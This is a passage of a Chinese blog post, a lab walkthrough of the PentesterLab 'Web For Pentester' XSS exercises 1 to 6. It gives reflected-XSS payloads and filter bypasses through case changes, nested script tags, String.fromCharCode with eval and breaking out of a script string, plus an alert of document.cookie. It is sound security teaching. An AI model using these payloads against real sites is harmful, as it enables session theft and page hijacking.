<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Dogboy" />



<meta name="description" content="记录了PentesterLab中的XSS题的解题方法，普及了一些XSS入门知识。本次做的是Web For Pentester靶机里面的XSS题目，一共有9道题目。关于靶机搭建参考这篇文章:渗透测试靶机的搭建">
<meta name="keywords" content="xss">
<meta property="og:type" content="article">
<meta property="og:title" content="Pentester中的XSS详解">
<meta property="og:url" content="http://blog.hackdog.cn/2017/02/15/pentester/index.html">
<meta property="og:site_name" content="StupidDog">
<meta property="og:description" content="记录了PentesterLab中的XSS题的解题方法，普及了一些XSS入门知识。本次做的是Web For Pentester靶机里面的XSS题目，一共有9道题目。关于靶机搭建参考这篇文章:渗透测试靶机的搭建">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/20971786578_72ddb0f672_k-800x450.jpg">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487060521470.jpg">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487060576715.jpg">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/timg.gif">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487061805281.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487061917891.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487062042951.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/gif.gif">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487062808288.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487062861659.jpg">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/xssg2.gif">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/xssGIF.gif">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487064501938.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487064555870.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487070653635.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487071173647.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487071785596.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487075590246.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487075768616.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487076684012.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/11.gif">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487084384411.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487085310932.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487085866489.jpg">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487086044647.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487087759277.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487088695901.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/1487089477245.png">
<meta property="og:image" content="http://ombgvjpli.bkt.clouddn.com/22g.gif">
<meta property="og:updated_time" content="2020-05-02T16:03:41.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Pentester中的XSS详解">
<meta name="twitter:description" content="记录了PentesterLab中的XSS题的解题方法，普及了一些XSS入门知识。本次做的是Web For Pentester靶机里面的XSS题目，一共有9道题目。关于靶机搭建参考这篇文章:渗透测试靶机的搭建">
<meta name="twitter:image" content="http://ombgvjpli.bkt.clouddn.com/20971786578_72ddb0f672_k-800x450.jpg">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">




    <link rel="shortcut icon" href="/img/favicon.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>Pentester中的XSS详解 | StupidDog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: 
    }
</script>


    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Dogboy</a></h1>
        </hgroup>

        

        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:1732164513@qq.com" title="Email"></a>
                            
                                <a class="fa GitHub" href="https://github.com/NORTHERNhacker" title="GitHub"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/HelloWorld/">HelloWorld</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali-Linux/">Kali Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/">Metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PentestBox/">PentestBox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/diy/">diy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wifi破解/">wifi破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/无线安全/">无线安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透测试/">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/神器/">神器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/笔记/">笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/虚拟化/">虚拟化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/运维/">运维</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/">国光</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://wiki.ioin.in/">安全文摘</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://hacktech.cn">Akkuman</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://www.lz1y.cn">Lz1y&#39;s blog</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">垃圾如我当积跬步以求行千里</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Dogboy</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Dogboy</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:1732164513@qq.com" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/NORTHERNhacker" title="GitHub"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-pentester" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/02/15/pentester/" class="article-date">
      <time datetime="2017-02-14T16:00:00.000Z" itemprop="datePublished">2017-02-15</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Pentester中的XSS详解
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/hacker/">hacker</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><center><img src="http://ombgvjpli.bkt.clouddn.com/20971786578_72ddb0f672_k-800x450.jpg" alt="image"></center><br>记录了PentesterLab中的XSS题的解题方法，普及了一些XSS入门知识。<br>本次做的是Web For Pentester靶机里面的XSS题目，一共有9道题目。<br>关于靶机搭建参考这篇文章:渗透测试靶机的搭建<br><a id="more"></a><br>本次做的是Web For Pentester靶机里面的XSS题目，一共有9道题目。<br>关于靶机搭建参考这篇文章:渗透测试靶机的搭建</p>
<h1 id="第1题-无过滤措施"><a href="#第1题-无过滤措施" class="headerlink" title="第1题(无过滤措施)"></a>第1题(无过滤措施)</h1><p>首先在后面输入xss:<br><a href="http://10.211.55.16/xss/example1.php?name=xss" target="_blank" rel="external">http://10.211.55.16/xss/example1.php?name=xss</a><br>看到如下页面：<br><img src="http://ombgvjpli.bkt.clouddn.com/1487060521470.jpg" alt="image"><br>然后查看下源码:<br><img src="http://ombgvjpli.bkt.clouddn.com/1487060576715.jpg" alt="image"><br>感觉这里没有任何的防御措施，忍不住笑出了声。<br><img src="http://ombgvjpli.bkt.clouddn.com/timg.gif" alt="image"><br>有很多的标签里面都可以调用HTML的事件属性来弹窗，为了节约时间，下面我就列举出一些比较常用的手法。</p>
<h2 id="利用基本的script标签来弹窗"><a href="#利用基本的script标签来弹窗" class="headerlink" title="利用基本的script标签来弹窗"></a>利用基本的script标签来弹窗</h2><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</div></pre></td></tr></table></figure>
<h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>script 标签用于定义客户端脚本，比如 JavaScript。</p>
<h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="http://ombgvjpli.bkt.clouddn.com/1487061805281.png" alt="image"></p>
<h2 id="利用iframe标签的的src属性来弹窗"><a href="#利用iframe标签的的src属性来弹窗" class="headerlink" title="利用iframe标签的的src属性来弹窗"></a>利用iframe标签的的src属性来弹窗</h2><h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;)&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure>
<h3 id="定义和用法-1"><a href="#定义和用法-1" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>iframe 元素会创建包含另外一个文档的内联框架（即行内框架）。</p>
<h3 id="效果图-1"><a href="#效果图-1" class="headerlink" title="效果图"></a>效果图</h3><p><img src="http://ombgvjpli.bkt.clouddn.com/1487061917891.png" alt="image"></p>
<h2 id="利用标签的href属性来弹窗"><a href="#利用标签的href属性来弹窗" class="headerlink" title="利用标签的href属性来弹窗"></a>利用<a>标签的href属性来弹窗</a></h2><h3 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=javascript:alert(&apos;xss&apos;)&gt;ggtest&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>这里就是超链接到了:<code>javascript:alert(&#39;xss&#39;)</code><br>效果和浏览器直接打开这个地址:<code>javascript:alert(&#39;xss&#39;)</code>是一样的<br>这里还可以使用：<code>javascript:alert(document.cookie)</code> 来弹出当前会话的cookie<br><img src="http://ombgvjpli.bkt.clouddn.com/1487062042951.png" alt="image"></p>
<h3 id="定义和用法-2"><a href="#定义和用法-2" class="headerlink" title="定义和用法"></a>定义和用法</h3><p><a> 标签定义超链接，用于从一张页面链接到另一张页面。<br><a> 元素最重要的属性是 href 属性，它指示链接的目标。<br>指向国光博客的一个例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;http://git.sqlsec.com”&gt;国光博客&lt;/a&gt;</div></pre></td></tr></table></figure></a></a></p>
<h3 id="效果图-2"><a href="#效果图-2" class="headerlink" title="效果图"></a>效果图</h3><p><img src="http://ombgvjpli.bkt.clouddn.com/gif.gif" alt="image"></p>
<h2 id="利用标签来弹窗"><a href="#利用标签来弹窗" class="headerlink" title="利用标签来弹窗"></a>利用<img>标签来弹窗</h2><h3 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;</div></pre></td></tr></table></figure>
<p>这里的src后面是填写的 是 <code>图片的地址</code>，为了 测试简便 这个地址里面我们一般随便填写,比如这里我们填写的就是 <code>1</code>，因为<code>1</code>不是一个正确的值，所以 触发了后面的 <code>onerror</code>事件（遇到错误 就触发）<br><img src="http://ombgvjpli.bkt.clouddn.com/1487062808288.png" alt="image"><br>当然如果在src里面填写一个正常的URL的话，就不会弹窗的了，因为onerror的触发条件是得报错。<br><img src="http://ombgvjpli.bkt.clouddn.com/1487062861659.jpg" alt="image"><br>当<code>src</code>后面的值是正确的时候呢，这个还可以用 <code>oneclick</code>事件来触发弹窗<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=http://www.sqlsec.com/favicon.ico onclick=alert(&apos;xss&apos;)&gt;</div></pre></td></tr></table></figure></p>
<p>这里不论src后面的值 是否正确，只要鼠标点击，就会触发 弹窗事件。<br><img src="http://ombgvjpli.bkt.clouddn.com/xssg2.gif" alt="image"><br>类似onerror和onclick的时间有很多种下面  </p>
<h3 id="列举出常见的事件"><a href="#列举出常见的事件" class="headerlink" title="列举出常见的事件"></a>列举出常见的事件</h3><h4 id="Windows事件属性"><a href="#Windows事件属性" class="headerlink" title="Windows事件属性"></a>Windows事件属性</h4><table>
<thead>
<tr>
<th>事件</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>onerror</td>
<td>在错误发生时运行的脚本</td>
<td></td>
</tr>
<tr>
<td>onload</td>
<td>页面结束加载之后触发</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="Keyboard-事件"><a href="#Keyboard-事件" class="headerlink" title="Keyboard 事件"></a>Keyboard 事件</h4><table>
<thead>
<tr>
<th>事件</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>onkeydown</td>
<td>在用户按下按键时触发</td>
</tr>
<tr>
<td>onkeypress</td>
<td>在用户敲击按钮时触发</td>
</tr>
<tr>
<td>onkeyup</td>
<td>当用户释放按键时触发</td>
</tr>
</tbody>
</table>
<h4 id="鼠标（Mouse）事件"><a href="#鼠标（Mouse）事件" class="headerlink" title="鼠标（Mouse）事件"></a>鼠标（Mouse）事件</h4><table>
<thead>
<tr>
<th>事件</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>onclick</td>
<td>元素上发生鼠标点击时触发</td>
</tr>
<tr>
<td>onmousedown</td>
<td>当元素上按下鼠标按钮时触发</td>
</tr>
<tr>
<td>onmousemove</td>
<td>当鼠标指针移动到元素上时触发。</td>
</tr>
<tr>
<td>onmouseover</td>
<td>当鼠标指针移动到元素上时触</td>
</tr>
<tr>
<td>onmouseout</td>
<td>当鼠标指针移出元素时触发</td>
</tr>
<tr>
<td>onmouseup</td>
<td>当在元素上释放鼠标按钮时触发</td>
</tr>
</tbody>
</table>
<h3 id="定义和用法-3"><a href="#定义和用法-3" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>img 元素向网页中嵌入一幅图像。<br>请注意，从技术上讲，<img> 标签并不会在网页中插入图像，而是从网页上链接图像。<img> 标签创建的是被引用图像的占位空间。<br><img> 标签有两个必需的属性：src 属性 和 alt 属性  </p>
<p>凡是支持事件的HTML标签都是可以弹窗的，在HTML中支持事件属性的标签很多，下面我就</p>
<h2 id="列举出一些支持事件的HTML常见标签"><a href="#列举出一些支持事件的HTML常见标签" class="headerlink" title="列举出一些支持事件的HTML常见标签"></a>列举出一些支持事件的HTML常见标签</h2><table>
<thead>
<tr>
<th>标签</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>a</td>
<td>定义超链接，用于从一张页面链接到另一张页面,最重要的属性是 href 属性，它指示链接的目标</td>
</tr>
<tr>
<td>article</td>
<td>规定独立的自包含内容一篇文章应有其自身的意义，应该有可能独立于站点的其余部分对其进行分发</td>
</tr>
<tr>
<td>audio</td>
<td>定义声音，比如音乐或其他音频流</td>
</tr>
<tr>
<td>b</td>
<td>规定粗体文本</td>
</tr>
<tr>
<td>body</td>
<td>定义文档的主体，包含文档的所有内容</td>
</tr>
<tr>
<td>br</td>
<td>只是简单地开始新的一行</td>
</tr>
<tr>
<td>button</td>
<td>定义一个按钮</td>
</tr>
<tr>
<td>iframe</td>
<td>会创建包含另外一个文档的内联框架</td>
</tr>
<tr>
<td>img</td>
<td>向网页中嵌入一幅图像</td>
</tr>
<tr>
<td>select</td>
<td>可创建单选或多选菜单</td>
</tr>
<tr>
<td>style</td>
<td>用于为 HTML 文档定义样式信息</td>
</tr>
<tr>
<td>textarea</td>
<td>标签定义多行的文本输入控件</td>
</tr>
<tr>
<td>video</td>
<td>定义视频，比如电影片段或其他视频流</td>
</tr>
</tbody>
</table>
<p>第一题因为没有任何的过滤，所以理论上支持调用HTML事件属性的标签都是可以成功弹窗的，下面来个</p>
<h2 id="综合点的payload"><a href="#综合点的payload" class="headerlink" title="综合点的payload"></a>综合点的payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://10.211.55.16/xss/example1.php?name=&lt;button type=&quot;button&quot; onclick=alert(&apos;xss&apos;)&gt;通过按钮点击触发xss&lt;/button&gt; &lt;font size=&quot;4&quot; color=&quot;blue&quot; onmouseover=alert(&apos;xss&apos;)&gt;  移动到元素触发xss  &lt;/font&gt; &lt;br&gt; </div><div class="line">&lt;select&gt; &lt;option onclick=alert(&apos;x&apos;)&gt;onclick点击触发事件&lt;/option&gt; &lt;option values=1 onmousedown=alert(&apos;ss&apos;)&gt;onmousedown触发&lt;/option&gt;&lt;/select&gt; &lt;a href=javascript:alert(&apos;xss&apos;)&gt;利用a标签的href属性触发&lt;/a&gt; &lt;br&gt;</div><div class="line">&lt;textarea placeholder=国光的xss测试：键盘按键触发xss onkeypress=alert(&apos;xss&apos;)&gt;&lt;/textarea&gt;</div></pre></td></tr></table></figure>
<p><img src="http://ombgvjpli.bkt.clouddn.com/xssGIF.gif" alt="image"></p>
<h1 id="第2题-大小写转换"><a href="#第2题-大小写转换" class="headerlink" title="第2题(大小写转换)"></a>第2题(大小写转换)</h1><p>这一题的话， 除了<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>这个payload,其他用第一题中的其他payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;)&gt;&lt;/iframe&gt;</div><div class="line">&lt;a href=javascript:alert(&apos;xss&apos;)&gt;ggtest&lt;/a&gt;</div><div class="line">&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>依然还是可以的，好吧，为了不这么容易做完这道题目，我们来下面的题目都尽量使用<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>来试试看<br><img src="http://ombgvjpli.bkt.clouddn.com/1487064501938.png" alt="image"><br>查看下源码:<br><img src="http://ombgvjpli.bkt.clouddn.com/1487064555870.png" alt="image"><br>这里我们猜测过滤<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code><br>然后这里尝试下大小写转换，尝试着绕过过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;Script&gt;alert(&apos;xss&apos;)&lt;/scripT&gt;</div></pre></td></tr></table></figure></p>
<p>可以看到成功绕过了:<br><img src="http://ombgvjpli.bkt.clouddn.com/1487070653635.png" alt="image">  </p>
<h1 id="第3题-嵌套构造"><a href="#第3题-嵌套构造" class="headerlink" title="第3题(嵌套构造)"></a>第3题(嵌套构造)</h1><p>直接输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;Script&gt;alert(&apos;xss&apos;)&lt;/scripT&gt;</div></pre></td></tr></table></figure></p>
<p>发现大小写转换的这个套路已经不能够使用了<br><img src="http://ombgvjpli.bkt.clouddn.com/1487071173647.png" alt="image"><br>得到结论是:没有过滤alert(‘xss’),现在就把注意力集中在 <code>&lt;script&gt;</code> 和<code>&lt;/script&gt;</code>上<br>Fuzz测试一下，看看具体过滤了哪些字符？然后再想办法绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.211.55.16/xss/example3.php?name=&lt;&gt;&lt;/&gt;script&lt;script&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://ombgvjpli.bkt.clouddn.com/1487071785596.png" alt="image"><br>可以看出过滤了:<code>&lt;/script&gt;</code>和<code>&lt;script&gt;</code><br>尝试构造输入:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.211.55.16/xss/example3.php?name=&lt;sc&lt;script&gt;ript&gt;</div></pre></td></tr></table></figure></p>
<p> <img src="http://ombgvjpli.bkt.clouddn.com/1487075590246.png" alt="image"><br> 查看源码后发现成功构造出<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div></pre></td></tr></table></figure></p>
<p> 于是判断这里只顾虑了一次，接着尝试构造如下完整的payload:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.211.55.16/xss/example3.php?name=&lt;sc&lt;script&gt;ript&gt;alert(&apos;xss&apos;)&lt;/s&lt;/script&gt;cript&gt;</div></pre></td></tr></table></figure></p>
<p> <img src="http://ombgvjpli.bkt.clouddn.com/1487075768616.png" alt="image">    </p>
<h1 id="第4题-利用标签绕过"><a href="#第4题-利用标签绕过" class="headerlink" title="第4题(利用标签绕过)"></a>第4题(利用标签绕过)</h1><p> 直接输入:<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>发现直接 <code>error</code> 了<br> 于是再次出尝试输入：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.211.55.16/xss/example4.php?name=&lt;&gt;alert(&apos;xss&apos;)&lt;/&gt;</div></pre></td></tr></table></figure></p>
<p> <img src="http://ombgvjpli.bkt.clouddn.com/1487076684012.png" alt="image"><br> 再次得出结论:没有过滤<code>&lt;&gt;</code> <code>&lt;/&gt;</code> <code>alerrt(&#39;xss&#39;)</code>,现在主要想办法对<code>script</code>做个处理来绕过过滤。<br> 然而我各种编码都没有绕过，有的编码的确是绕过了，但是貌似没有解析脚本  =,=<br> 哎~~~放弃用这种形式的<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>的payload了，于是乎使用下面的<code>&lt;img&gt;标签</code>成功绕过：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;</div></pre></td></tr></table></figure></p>
<h1 id="第5题-String-fromCharCode编码绕过"><a href="#第5题-String-fromCharCode编码绕过" class="headerlink" title="第5题(String.fromCharCode编码绕过)"></a>第5题(String.fromCharCode编码绕过)</h1><p> 首先执行:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p> 发现直接就 报 error了，于是fuzz测试发现并没有过滤:<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code><br> 只是过滤了:<code>alert</code><br> 利用火狐浏览器的<code>hackbar</code>插件对<code>alert(&#39;xss&#39;)</code>进行<code>String.fromCharCode</code>转换:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59))&lt;/script&gt;</div></pre></td></tr></table></figure>
<p> <img src="http://ombgvjpli.bkt.clouddn.com/11.gif" alt="image"></p>
<h1 id="第6题-闭合标签"><a href="#第6题-闭合标签" class="headerlink" title="第6题(闭合标签)"></a>第6题(闭合标签)</h1><p> 首先默认查看下源码:<br> <img src="http://ombgvjpli.bkt.clouddn.com/1487084384411.png" alt="image"><br> 发现我们输出的<code>hacker</code>作为了一个变量赋值给了a，并且这个变量在<code>&lt;script&gt;</code>这个标签中<br> 这样的话，只要能够突破这个赋值的变量，就可以利用这个<code>&lt;script&gt;</code>这个标签来弹窗了。<br> 下面想办法闭合进行fuzz测试……<br> 这里边看源码边做调整。几次测试后得到如下可以弹窗的payload:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">11&quot;;&lt;/script&gt;&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;&lt;script&gt;</div></pre></td></tr></table></figure></p>
